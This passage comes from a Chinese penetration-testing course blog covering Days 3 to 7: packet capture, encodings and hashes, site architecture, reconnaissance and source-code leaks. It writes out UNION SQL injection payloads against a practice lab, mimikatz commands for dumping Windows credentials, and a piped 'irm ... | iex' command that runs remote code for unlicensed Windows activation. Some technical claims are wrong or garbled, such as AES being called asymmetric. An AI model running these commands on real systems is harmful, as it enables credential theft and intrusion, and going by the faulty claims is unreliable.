document</span><br><span class="line">Referer: https://cn.bing.com/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">手机</span><br><span class="line">Mozilla/5.0 (Linux; <span class="strong">**Android**</span> 7.1.2; HD1900) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36</span><br></pre></td></tr></table></figure><p>可以看到他会显示不同的系统,然后可以通过替换这个User-Agent来实现在电脑端访问手机端样式的界面</p><p><img src="/../image/image-20240319222851169.png" alt="image-20240319222851169"></p><p>返回包-网站文件目录扫描-返回状态码</p><p>文件夹 403 存在 404 不存在 </p><p>文件 200 存在 404 不存在</p><p>3xx 跳转 处置过程 判断可有可无</p><p>5xx 内部错误 服务器问题 判断可有可无</p><p>所以可以在bp里，设置如下参数，然后用列表等扫描</p><p><img src="/../image/image-20240319224355849.png" alt="image-20240319224355849"></p><p>然后根据状态码来确定是否存在</p><p><img src="/../image/image-20240319224536900.png" alt="image-20240319224536900"></p><p>也是一种目录扫描的方法</p><p>数据包-WAF文件目录扫描-代理服务器</p><p>快代理<a href="https://www.kuaidaili.com/free/%EF%BC%8C%E8%BF%99%E6%A0%B7%E5%AD%90%E5%8F%AF%E4%BB%A5%E8%AE%A9%E4%BD%A0%E7%9A%84ip%E4%BD%8D%E7%BD%AE%E5%8F%98%E5%BE%97%E4%B8%8D%E7%A1%AE%E5%AE%9A%EF%BC%8C%E5%A6%82%E6%9E%9C%E4%BD%A0%E7%9A%84ip%E8%A2%AB%E6%8B%89%E9%BB%91%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E8%BF%99%E4%B8%AA%E6%96%B9%E5%BC%8F%E6%9D%A5%E8%A7%A3%E5%86%B3">https://www.kuaidaili.com/free/，这样子可以让你的ip位置变得不确定，如果你的ip被拉黑可以通过这个方式来解决</a></p><h1 id="Day3-抓包-封包-协议-APP-小程序-PC应用-WEB应用"><a href="#Day3-抓包-封包-协议-APP-小程序-PC应用-WEB应用" class="headerlink" title="Day3:抓包 封包 协议 APP 小程序 PC应用 WEB应用"></a>Day3:抓包 封包 协议 APP 小程序 PC应用 WEB应用</h1><h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="#知识点:"></a>#知识点:</h2><ul><li>抓包技术应用意义</li><li>抓包技术应用对象</li><li>抓包技术应用协议</li><li>抓包技术应用支持</li><li>封包技术应用意义</li><li>总结点:学会不同对象采用不同抓包封包抓取技术分析</li></ul><p>基于网络接口抓包-网络接口</p><p>基于程序进程抓包-程序进程</p><p>基于数据协议抓包-HTTP&#x2F;S&amp;TCP&amp;UDP</p><p>基于应用对象抓包-APP&amp;小程序&amp;PC UI</p><p>基于系统使用抓包-模拟器&amp;WIN&amp;LINUX</p><h3 id="win10激活"><a href="#win10激活" class="headerlink" title="win10激活"></a>win10激活</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell</span><br><span class="line">irm https://massgrave.dev/get |iex</span><br><span class="line">弹出来的命令窗，选，是</span><br><span class="line">然后出来的窗口，在下面输入：1，回车等待激活</span><br></pre></td></tr></table></figure><h2 id="参考点"><a href="#参考点" class="headerlink" title="#参考点:"></a>#参考点:</h2><p><strong>Fiddler:</strong></p><p>是一个http协议调试代理工具，它能够记录并检查所有你的电脑和互联网之间的http通讯，设置断点，查看所有的“进出”Fiddler的数据(指cookie,html，js,css等文件)。 Fiddler 要比其他的网络调试器要更加简单，因为它不仅仅暴露http通讯还提供了一个用户友好的格式。</p><p><strong>charles：</strong></p><p>是一个HTTP代理服务器,HTTP监视器,反转代理服务器，当浏览器连接charles的代理司互联网时，Charles可以监控浏览器发送和接收的所有数据。它允许一个开发者查看有连接互联网的HTTP通信，这些包括request，response和HTTPheaders(包含ookies与caching信息)</p><p><strong>TCPDump:</strong></p><p>是可以将网络中传送的数据包完全截获下来提供分析。它支持针对网络层、协议、主机、网络或端口的过滤，并提供and、or、not等逻辑语句来帮助你去掉无用的信<br>志。</p><p><strong>BurpSuite:</strong></p><p>是用于攻击web 应用程序的集成平台，包含了许多工具。Burp suite为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP 消息、持久性、认证、代理、日志、警报。</p><p><strong>wireshark:</strong></p><p>是一个网络封包分析软件。网络封包分析软件的功能是截取网络封包，并尽可能显示出最为详细的网络封包资料。wireshark使用winecAP作为接口，直接与网卡进行数据报文交换。</p><p><strong>科来网络分析系统:</strong></p><p>是一款由科来软件全自主研发，并拥有全部知识产品的网络分析产品。该系统具有行业领先的专家分析技术，通过捕获并分析网络中传输的底层数据包，对网络故障、网络安全以及网络性能进行全面分析，从而快速排查网络中出现或潜在的故障、安全及性能问题。</p><p><strong>WPE&amp;封包分析:</strong></p><p>是强大的网络封包编辑器，wpe可以截取网络上的信息，修改封包数据是外挂制作的常用工具。一般在安全测试中可用来调试数据通讯地址。</p><h2 id="演示案例-1"><a href="#演示案例-1" class="headerlink" title="演示案例:"></a><strong>演示案例:</strong></h2><p>WEB应用站点操作数据抓包-<strong>浏览器审查</strong>查看元素网络监听</p><p>APP&amp;小程序&amp;PC抓包HTTP&#x2F;S数据-Charles&amp;Fiddler&amp;Burpsuite</p><p>程序进程&amp;网络接口&amp;其他协议抓包-WireShark&amp;科来网络分析系统</p><p>这两个是可以抓到更多的协议的数据包</p><p>通讯类应用封包分析发送接收-WPE四件套封包&amp;科来网络分析系统</p><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><h4 id="环境配置-1"><a href="#环境配置-1" class="headerlink" title="#环境配置:"></a>#环境配置:</h4><p>1、安卓模拟器安装搭建</p><p>逍遥，雷电，夜神等自行百度下载安装</p><p>2、工具相关证书安装指南<br>Charles<br><a href="http://t.csdnimg.cn/Qpuxc">http://t.csdnimg.cn/Qpuxc</a></p><p><a href="https://blog.csdn.net/weixin45459427/article/details/108393878">https://blog.csdn.net/weixin45459427/article/details/108393878</a></p><p>Fidder<br><a href="https://blog.csdn.net/weixin_45043349/article/details/120088449">https://blog.csdn.net/weixin_45043349/article/details/120088449</a></p><p>BurpSuite<br><a href="https://blog.csdn.net/qg36658099/article/details/81487491">https://blog.csdn.net/qg36658099/article/details/81487491</a></p><p>1、为什么要抓包?-抓包应用的资产信息进行安全测试</p><p>2、抓包对象有那些?-小程序,APP,桌面应用等</p><p>3、抓包协议区别工具?-有部分应用不走HITP&#x2F;S，需要用到全局协议抓包</p><p>4、封包和抓包不同之处? 零散整体的区别，封包能精确到每个操作的数据包</p><h1 id="Day4：30余种加密编码进制-Web-数据库-系统-代码-参数值"><a href="#Day4：30余种加密编码进制-Web-数据库-系统-代码-参数值" class="headerlink" title="Day4：30余种加密编码进制_Web_数据库_系统_代码_参数值"></a>Day4：30余种加密编码进制_Web_数据库_系统_代码_参数值</h1><h2 id="知识点-2"><a href="#知识点-2" class="headerlink" title="#知识点:"></a>#知识点:</h2><p>1、存储密码加密-web&amp;数据库&amp;系统</p><p>2、传输数据编码-各类组合传输参数值</p><p>3、代码特性加密-JSPHPNETEJAVA</p><p>4、数据显示编码-字符串数据显示编码</p><h2 id="本课意义"><a href="#本课意义" class="headerlink" title="#本课意义:"></a>#本课意义:</h2><p>1.了解加密编码进制在安全测试中的存在</p><p>2.掌握常见的加密解密编码解码进制互转的操作</p><p>3.了解常见的加密解密编码解密进制互转的影够</p><p>旨在解决类似疑问，提供思路:</p><p>你是否碰到不知道的加密方式?</p><p>你是否碰到无法找到的解密平台?</p><p>你是否碰到不知道如何解密的字符串?</p><p>你是否准备参加CTF比赛补充此类知识点?</p><h2 id="详细点："><a href="#详细点：" class="headerlink" title="#详细点："></a>#详细点：</h2><h3 id="密码存储加密"><a href="#密码存储加密" class="headerlink" title="密码存储加密"></a>密码存储加密</h3><p>MD5 H1S  RMD5值是32位由数字”0-9”和字母”a-f”所组成的字符串</p><p>SHA1这种加密的密文特征跟MD5差不多，只不过位数是40</p><p>NTLM这种加密是windows的哈希密码，标准通讯安全协议</p><p>AES，DES，RC4这些都是非对称性加密算法，引入密钥，密文特征与Base64类似</p><p>应用场录:各类应用密文，自定义算法，代码分析，CrE安全比赛等</p><h3 id="传输数据编码"><a href="#传输数据编码" class="headerlink" title="传输数据编码:"></a>传输数据编码:</h3><p>BASE64 URL HEX ASCII</p><p>BASE64值是由数字”0-9”和字母”a-f”所组成的字符串,大小写敏感,结尾通常有符号&#x3D;</p><p>URI编码是由数字”0-9”和字母”a-f”所组成的字符串,大小写敏感,通常以&amp;数字字母间隔</p><p>HEX编码是计算机中数据的一种表示方法,将数据进行十六进制转换，它由0-9，A-F组成</p><p>ASCII编码是将128个字符进行进制数来表示，常见ASCII码表大小规则:0<del>9&lt;A</del>z&lt;a</p><h3 id="举例"><a href="#举例" class="headerlink" title="举例:"></a>举例:</h3><p>个人博客-URL解码</p><p>国外WEB-BASE64解码</p><p>搜狐视频-BASE64解码</p><p>应用场景:参数传递(如注入影响)，后期WAF绕过干扰写法应用，视频地址还原等</p><h3 id="js前端代码加密："><a href="#js前端代码加密：" class="headerlink" title="js前端代码加密："></a>js前端代码加密：</h3><p>Js颜文字 jother JSFUCK</p><p>颜文字特征:一堆颜文字构成的1代码，在12中可直接解密执行</p><p>jother特征:只用 !  + ( )[ ]{ }这八个字符就能完成对任意字符串的编码。也可在F12中解密执行</p><p>JSFUCK特征:与jother很像，只是少了{ }</p><h3 id="后端代码加密"><a href="#后端代码加密" class="headerlink" title="后端代码加密:"></a>后端代码加密:</h3><p>PHP NET JAVA</p><p>PHP:乱码，头部有信息</p><p>.NEI:DLL封装代码文件</p><p>JAVA:JAVACLASS文件</p><p>举例:zend ILSPY IDEA （zend php文件打开是乱码，通过文件头信息判断）</p><p>应用场景:版权代码加密，开发特性，CTF比赛等</p><h3 id="数据库密文加密"><a href="#数据库密文加密" class="headerlink" title="数据库密文加密:"></a>数据库密文加密:</h3><p>MYSQL MSSQL等</p><p> mysql-&gt;user-&gt;密码也可以在cmd5解密</p><h3 id="数据显示编码："><a href="#数据显示编码：" class="headerlink" title="数据显示编码："></a>数据显示编码：</h3><p>UTF-8, GBK2312</p><h3 id="识别算法编码类型："><a href="#识别算法编码类型：" class="headerlink" title="识别算法编码类型："></a>识别算法编码类型：</h3><p>1、看位数</p><p>2、看密文的特征（数字、字母、大小写、符号等）</p><p>3、看当前密文存在的地方（Web、数据库、操作系统等应用）</p><h2 id="演示案例-2"><a href="#演示案例-2" class="headerlink" title="演示案例:"></a>演示案例:</h2><h4 id="Web-ZZCMS-密文-MD5"><a href="#Web-ZZCMS-密文-MD5" class="headerlink" title="Web-ZZCMS-密文-MD5"></a>Web-ZZCMS-密文-MD5</h4><p>这个网站下载源码直接放到www目录下即可，但后面发现nginx的配置里有个文件带有空格，会报错，重新移出来后才没有，还有一个注意点，这个设置主页是最好选到zzcms文件里，不能只到www，因为安装引导时，目录是根目录下的install而不是zzcms下的install，那样403了好久，一直以为权限问题。。。接下来下一步，下一步就好，信息正常填。</p><p><img src="/../image/image-20240322152833066.png" alt="image-20240322152833066"></p><p><img src="/../image/image-20240322152905896.png" alt="image-20240322152905896"></p><p>有两个管理员，然后去数据库里看看密码是如何存储的</p><p><img src="/../image/image-20240322153145609.png" alt="image-20240322153145609"></p><p>去cmd5.com验证一下</p><p><img src="/../image/image-20240322153223102.png" alt="image-20240322153223102"></p><p><img src="/../image/image-20240322153532437.png" alt="image-20240322153532437"></p><h4 id="Web-Discuz-密文-MD5-amp-Salt"><a href="#Web-Discuz-密文-MD5-amp-Salt" class="headerlink" title="Web-Discuz-密文-MD5&amp;Salt"></a>Web-Discuz-密文-MD5&amp;Salt</h4><p>安装Discuz时目录要选到uploads下，然后下一步下一步就是了</p><p><img src="/../image/image-20240322161139610.png" alt="image-20240322161139610"></p><p>注册一个用户看看</p><p><img src="/../image/image-20240322161513691.png" alt="image-20240322161513691"></p><p>然后我们去查是查不到的，需要知道他的盐值</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md</span>(<span class="string">&#x27;123456&#x27;</span>),<span class="string">&quot;d825a3&quot;</span>); --php5.<span class="number">5</span>之前</span><br><span class="line"><span class="title function_ invoke__">password_hash</span>() --php5.<span class="number">5</span>之后</span><br></pre></td></tr></table></figure><p>但Discuz的加密方式是前一种，去另一个表中查看一下带有盐值的表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from pre_ucenter_members;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240322163728021.png" alt="image-20240322163728021"></p><p>前面被$包住的就是盐值，但不知道为什么盐值是空的，导出数据库看看。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqldump -uroot -proot dbname &gt; dbname.sql</span><br></pre></td></tr></table></figure><p>因为我们这个使用password_hash()返回的值</p><p><img src="/../image/image-20240322165230036.png" alt="image-20240322165230036"></p><p>只能这样验证了</p><p><a href="https://www.mozhe.cn/bug/detail/elRHc1BCd2VIckQxbjduMG9BVCtkZz09bW96aGUmozhe">练习</a></p><p>信息收集</p><p><img src="/../image/image-20240322171623378.png" alt="image-20240322171623378"></p><p><img src="/../image/image-20240322171642952.png" alt="image-20240322171642952"></p><p>主要有上面两个界面，前一个页面时没有注入点的，怎么测试都是正常回显，但后面的页面当输入的id&#x3D;2时，页面会异常回显，说明该页面存在注入点。</p><p>判断类型 id&#x3D;1 and 1&#x3D;2-1，正常回显说明是数字型，判断列数 order by 4，4列</p><p>判断回显位</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1,2,3,4 #</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240322172148784.png" alt="image-20240322172148784"></p><p>下面就是正常的三步走</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,database(),3,4 #</span><br><span class="line">?id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()</span><br><span class="line">?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema=database() and table_name=&#x27;StormGroup_member&#x27;</span><br><span class="line">?id=-1 union select 1,group_concat(name,&#x27;~&#x27;,password),3,4 from StormGroup_member</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240322172245928.png" alt="image-20240322172245928"></p><p><img src="/../image/image-20240322172450975.png" alt="image-20240322172450975"></p><p><img src="/../image/image-20240322172546176.png" alt="image-20240322172546176"></p><p><img src="/../image/image-20240322172704509.png" alt="image-20240322172704509"></p><p><img src="/../image/image-20240322172834903.png" alt="image-20240322172834903"></p><p>猜测密码是md5，cmd5测试一下mozhe-841076</p><p>系统-Windows-密文-NTLM&amp;HASH</p><p>mimikatz要以<strong>管理身份</strong>打开</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240322174208878.png" alt="image-20240322174208878"></p><p>同样可以去cmd5验证，但有的也没有</p><h4 id="综合-参数-密文传输-AES-amp-BASE64"><a href="#综合-参数-密文传输-AES-amp-BASE64" class="headerlink" title="综合-参数-密文传输-AES&amp;BASE64"></a><strong>综合-参数-密文传输-AES&amp;BASE64</strong></h4><p><a href="http://tool.chacuo.net/cryptdes%E5%B7%A5%E5%85%B7%E7%BD%91%E7%AB%99">http://tool.chacuo.net/cryptdes工具网站</a></p><p><a href="https://www.mozhe.cn/bug/detail/110">练习</a></p><p><img src="/../image/image-20240322203510007.png" alt="image-20240322203510007"></p><p>注意到参数很长，可能是加密后的参数，信息收集一下</p><p><img src="/../image/image-20240322203621578.png" alt="image-20240322203621578"></p><p>这里是网页源代码，可以下载下来看看</p><p><img src="/../image/image-20240322203805719.png" alt="image-20240322203805719"></p><p>可以看到加密流程，我们搜索一下各个函数的信息</p><p><img src="/../image/image-20240322203855700.png" alt="image-20240322203855700"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$td</span> = <span class="title function_ invoke__">mcrypt_module_open</span>(MCRYPT_RIJNDAEL_128,<span class="string">&#x27;&#x27;</span>,MCRYPT_MODE_CBC,<span class="string">&#x27;&#x27;</span>);<span class="comment">//AES加密，128块，模式CBC</span></span><br><span class="line">    <span class="title function_ invoke__">mcrypt_generic_init</span>(<span class="variable">$td</span>,<span class="string">&#x27;ydhaqPQnexoaDuW3&#x27;</span>,<span class="string">&#x27;2018201920202021&#x27;</span>);<span class="comment">//前面是密钥，后面是偏移量</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">mdecrypt_generic</span>(<span class="variable">$td</span>,<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$data</span>)));<span class="comment">//两次base64加密，说明还要解密一次，才能作运算</span></span><br><span class="line"><span class="title function_ invoke__">mcrypt_generic_deinit</span>(<span class="variable">$td</span>);</span><br><span class="line"><span class="title function_ invoke__">mcrypt_module_close</span>(<span class="variable">$td</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$data</span>),-<span class="number">6</span>)!==<span class="string">&#x27;_mozhe&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;window.location.href=&quot;/index.php&quot;;&lt;/script&gt;&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$data</span>),<span class="number">0</span>,<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$data</span>))-<span class="number">6</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先base64解密一次</p><p><img src="/../image/image-20240322204222067.png" alt="image-20240322204222067"></p><p>再去aes解密</p><p><img src="/../image/image-20240322204315425.png" alt="image-20240322204315425"></p><h4 id="代码-解密-解密反编译-Zend-amp-Dll-amp-Jar"><a href="#代码-解密-解密反编译-Zend-amp-Dll-amp-Jar" class="headerlink" title="代码-解密-解密反编译-Zend&amp;Dll&amp;Jar"></a><strong>代码-解密-解密反编译-Zend&amp;Dll&amp;Jar</strong></h4><p>CTF赛题-buuoj-single dog-JS颜文字</p><p>CTF赛题-xuenixiang-Jsfuck-JSFUCK</p><h2 id="补充点"><a href="#补充点" class="headerlink" title="#补充点:"></a>#补充点:</h2><p>1.常见加密编码进制等算法解析</p><p>MD5，SHA，ASC，进制，时间戳，URL，BASE64，Unescape，AES，DES等</p><p>2.常见加密编码形式算法解析</p><p>直接加密，带sa1t，带密码，带偏移，带位数，带模式，带干扰，自定义组合等</p><p>3.常见解密解码方式(针对)</p><p>枚举，自定义逆向算法，可逆向</p><p>4.常见加密解码算法的特性</p><p>长度位数，字符规律，代码分析，搜索获取等</p><h3 id="拓展补充参考盗料"><a href="#拓展补充参考盗料" class="headerlink" title="#拓展补充参考盗料:"></a>#拓展补充参考盗料:</h3><p>部分资源:<br><a href="https://www.cmd5.com/">https://www.cmd5.com</a></p><p><a href="http://tmxk.org/jother">http://tmxk.org/jother</a></p><p><a href="http://www.jsfuck.com/">http://www.jsfuck.com</a></p><p><a href="http://www.hiencode.com/">http://www.hiencode.com</a><br><a href="http://tool.chacuo.net/cryptaes">http://tool.chacuo.net/cryptaes</a></p><p><a href="https://utf-8.jp/public/aanocde.html">https://utf-8.jp/public/aanocde.html</a></p><h1 id="Day5：资产架构-端口-应用-CDN-WAF-站库分离-负载ay均衡"><a href="#Day5：资产架构-端口-应用-CDN-WAF-站库分离-负载ay均衡" class="headerlink" title="Day5：资产架构_端口_应用_CDN_WAF_站库分离_负载ay均衡"></a>Day5：资产架构_端口_应用_CDN_WAF_站库分离_负载ay均衡</h1><h2 id="知识点-3"><a href="#知识点-3" class="headerlink" title="#知识点:"></a>#知识点:</h2><p>1、资产架构-端口&amp;目录&amp;播件接口s多站点&amp;多应用</p><p>2、番外安全-域名&amp;服务器本身&amp;服务厂商:管理人员</p><p>3、考虑阻碍-站库分离&amp;CDN&amp;WAF&amp;负载均衡&amp;主机防护</p><h2 id="详细点"><a href="#详细点" class="headerlink" title="#详细点:"></a>#详细点:</h2><p>1、前置条件-购买使用-云服务器&amp;域名等</p><p>2、架构搭建-目录&amp;端口&amp;子域s插件&amp;应用等</p><p>3、安全部署-WAF防火墙s主机防护sHIDS等</p><p>4、性能优化-负载均衡:CDI加速soss云存储等</p><h2 id="演示案例-3"><a href="#演示案例-3" class="headerlink" title="演示案例:"></a>演示案例:</h2><p>资产架构-BT搭建&amp;多站点&amp;多插件&amp;多应用等</p><p>在之前的服务器的基础上，搭建一个网站</p><p><img src="/../image/image-20240323152352818.png" alt="image-20240323152352818"></p><p><img src="/../image/image-20240323154746404.png" alt="image-20240323154746404"></p><p>没有域名就用自己的ip地址，然后选一个非网站根目录的文件，或自己新建一个文件夹</p><p><img src="/../image/image-20240323154833089.png" alt="image-20240323154833089"></p><p>然后一直下一步，把信息填好就ok了，那个初始化可以不用填</p><p><img src="/../image/image-20240323155029222.png" alt="image-20240323155029222"></p><p>也有可能一个网站里有两个程序，任何一个程序出现漏洞，都可能进入安全测试</p><p>番外安全-Aliyun&amp;域名解析&amp;云服务器&amp;个人等</p><p>考虑阻碍-站库分离&amp;部署防护&amp;负载均衡&amp;CDN等</p><h3 id="资产架构"><a href="#资产架构" class="headerlink" title="#资产架构:"></a>#资产架构:</h3><p>WEB单个源码指向安全</p><p>WEB多个目录源码安全</p><p>WEB多个端口源码安全</p><p>服务器架设多个站点安全</p><p>架设第三方插件接口安全 phpmyadmin之类的，方便管理人员但也给攻击者提供了机会</p><p>服务器架设多个应用安全 ftp之类的</p><h3 id="番外安全"><a href="#番外安全" class="headerlink" title="#番外安全:"></a>#番外安全:</h3><p>基于域名解析安全</p><p>基于服务器本身安全</p><p>基于服务商信息安全</p><p>基于管理个人的安全</p><h3 id="考虑阻碍"><a href="#考虑阻碍" class="headerlink" title="#考虑阻碍:"></a>#考虑阻碍:</h3><p>阻碍-站库分离 数据库放在别的地方</p><p>阻碍-CDN加速服务</p><p><strong>CDN</strong>英文全称<code>Content Delivery Network</code>，中文翻译即为<a href="https://cloud.tencent.com/product/cdn?from_column=20065&from=20065"><strong>内容分发网络</strong></a>。它是建立并覆盖在承载网之上，由分布在不同区域的边缘节点服务器群组成的分布式网络。</p><p>阻碍-<a href="https://blog.csdn.net/wanghangzhen/article/details/118554304">负载均衡服务</a></p><p>就是你最终获取到的是备用服务器信息</p><p>阻碍-WAF应用防火墙</p><p>阻碍-主机防护防火墙</p><h1 id="Day6-信息打点-Web架构篇-域名-语言-中间件-数据库-系统-源码获取"><a href="#Day6-信息打点-Web架构篇-域名-语言-中间件-数据库-系统-源码获取" class="headerlink" title="Day6: 信息打点-Web架构篇_域名_语言_中间件_数据库_系统_源码获取"></a>Day6: 信息打点-Web架构篇_域名_语言_中间件_数据库_系统_源码获取</h1><h2 id="知识点-4"><a href="#知识点-4" class="headerlink" title="#知识点:"></a>#知识点:</h2><p>1、打点-web架构-语言&amp;中间件&amp;数据库&amp;系统等</p><p>2、打点-web源码-CMs开源s闭源售卖&amp;自主研发等</p><p>3、打点-web源码获取-泄露安全&amp;资源监控&amp;其他等</p><p>4、打点-web域名-子域名&amp;相似域名&amp;反查域名&amp;旁注等</p><h2 id="信息点"><a href="#信息点" class="headerlink" title="#信息点:"></a>#信息点:</h2><p>基础信息，系统信息，应用信息，防护信息，人员信息，其他信息等</p><h2 id="技术点"><a href="#技术点" class="headerlink" title="#技术点:"></a>#技术点:</h2><p>cMs识别，端口扫描，CDN绕过，源码获取，子域名查询，wAE识别，负载均衡识别等</p><h2 id="演示案例-4"><a href="#演示案例-4" class="headerlink" title="演示案例:"></a>演示案例:</h2><p>信息打点-个人博客-YOUZIPII-架构&amp;源码</p><p>信息打点-某违法APP-面具约会-架构&amp;源码</p><p>信息打点-某违法应用-爱心工程-架构&amp;域名</p><p>信息打点-某专属SRC-补天平台-架构&amp;域名</p><p><img src="/../image/image-20240325203443839.png" alt="image-20240325203443839"></p><p>根据这个可以查出更多信息，比如中间件推测端口，服务，脚本语言推测常用数据库</p><p><a href="https://blog.csdn.net/zengxianglei/article/details/94357189">关系型和非关系型数据库的区别</a></p><p>mysql 3306 </p><p>mssql 1443 </p><p>oracle 1521 </p><p>redis 6379 </p><p>DB2  5000</p><p>国产DM达梦数据库 5236</p><p>MongoDB 27017</p><p>判断方式也不一定准确。下面是默认操作系统的TTL：<br>1、WINDOWS NT&#x2F;2000   TTL：128<br>2、WINDOWS 95&#x2F;98     TTL：32<br>3、UNIX              TTL：255<br>4、LINUX             TTL：64<br>5、WIN7          TTL：128</p><p><img src="/../image/image-20240325205214933.png" alt="image-20240325205214933"></p><p>源码-直接利用公开的漏洞库尝试安全测试</p><p>源码-白盒代码审计 挖漏洞</p><p>msql漏洞或弱口令</p><p>php常见的漏洞 如log4j</p><h3 id="黑源码"><a href="#黑源码" class="headerlink" title="黑源码"></a>黑源码</h3><p><a href="https://www.huzhan.com/">https://www.huzhan.com/</a><br><a href="https://28xin.com/">https://28xin.com/</a><br><a href="https://bbs.bcb5.com/">https://bbs.bcb5.com/</a><br><a href="https://www.shixinwl.com/">https://www.shixinwl.com/</a><br><a href="https://www.lengcat.com/">https://www.lengcat.com/</a><br><a href="https://www.xlymz.com/">https://www.xlymz.com/</a><br><a href="https://www.ymadx.com/">https://www.ymadx.com/</a><br>……..</p><p>更多针对违法应用源码：<br>可利用fofa和bing、谷歌等搜索关键字获取</p><p><a href="http://www.jmlsd.com/">www.jmlsd.com</a></p><p>子域名：变动www</p><p>变动jmlsd或com为相似域名</p><p><a href="https://www.cnblogs.com/Timeouting-Study/p/16082575.html">jessionid和session</a></p><p>有时候有CDN存在，扫描可能就没那么有用了。</p><h1 id="Day7-信息打点-资产泄漏-CMS识别-Git监控-SVN-DS-Store-备份"><a href="#Day7-信息打点-资产泄漏-CMS识别-Git监控-SVN-DS-Store-备份" class="headerlink" title="Day7:信息打点-资产泄漏_CMS识别_Git监控_SVN_DS_Store_备份"></a>Day7:信息打点-资产泄漏_CMS识别_Git监控_SVN_DS_Store_备份</h1><h2 id="知识点-5"><a href="#知识点-5" class="headerlink" title="#知识点:"></a>#知识点:</h2><p>1、CMS指纹识别源码获取方式</p><p>2、习惯&amp;配置&amp;特性等获取方式</p><p>3、托管资产平台资源搜索监控</p><h2 id="详细点-1"><a href="#详细点-1" class="headerlink" title="#详细点:"></a>#详细点:</h2><p>参考:<a href="https://www.secpulse.com/archives/124398.html%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E5%8E%9F%E5%9B%A0">https://www.secpulse.com/archives/124398.html源码泄漏原因</a>:<br>源码泄漏原因:<br>1、从源码本身的特性入口2、从管理员不好的习惯入口<br>3、从管理员不好的配置入口<br>4、从管理员不好的意识入口<br>5、从管理员资源信息搜集入口</p><ul><li>composer.jspn</li><li>git源码泄露</li><li>svn源码泄露</li><li>hg源码泄漏</li><li>网站备份压缩文件</li><li>WEB-INF&#x2F;web.xml泄露文件泄露DSStore</li><li>SwP 文件泄露</li><li>cvs泄露</li><li>Bzr泄露</li><li>GitHub源码泄漏</li></ul><h2 id="演示案例-5"><a href="#演示案例-5" class="headerlink" title="演示案例:"></a>演示案例:</h2><h3 id="直接获取-CMS识别-云悉指纹识别平台"><a href="#直接获取-CMS识别-云悉指纹识别平台" class="headerlink" title="直接获取-CMS识别-云悉指纹识别平台"></a>直接获取-CMS识别-云悉指纹识别平台</h3><p><a href="https://www.yunsee.cn/">云悉指纹</a>,然后下载进行白盒审计</p><h3 id="习惯不好-备份文件-某黑阔博客源码泄漏"><a href="#习惯不好-备份文件-某黑阔博客源码泄漏" class="headerlink" title="习惯不好-备份文件-某黑阔博客源码泄漏"></a>习惯不好-备份文件-某黑阔博客源码泄漏</h3><p>相关利用项目:</p><p>CMS只别:<a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></p><p>份:敏感目录文件扫描-7kbscan-webPathBrute</p><p>CVs:<a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a></p><p>GIT: <a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p><p>SVN:<a href="https://github.com/callmefeifei/SvnHack">https://github.com/callmefeifei/SvnHack</a></p><p>Ds_Store: <a href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp</a></p><h3 id="配置不当-GIT泄漏-某程序员博客源码泄漏"><a href="#配置不当-GIT泄漏-某程序员博客源码泄漏" class="headerlink" title="配置不当-GIT泄漏-某程序员博客源码泄漏"></a>配置不当-GIT泄漏-某程序员博客源码泄漏</h3><p>可以试试访问.git目录，存在的话就可以试试利用</p><h3 id="配置不当-SVN泄漏-某国外小伙子源码泄漏"><a href="#配置不当-SVN泄漏-某国外小伙子源码泄漏" class="headerlink" title="配置不当-SVN泄漏-某国外小伙子源码泄漏"></a>配置不当-SVN泄漏-某国外小伙子源码泄漏</h3><h3 id="配置不当-DS-Store泄漏-某开发Mac源码泄漏"><a href="#配置不当-DS-Store泄漏-某开发Mac源码泄漏" class="headerlink" title="配置不当-DS_Store泄漏-某开发Mac源码泄漏"></a>配置不当-DS_Store泄漏-某开发Mac源码泄漏</h3><h3 id="PHP特性-composer-json泄漏-某直接搭建源码泄漏"><a 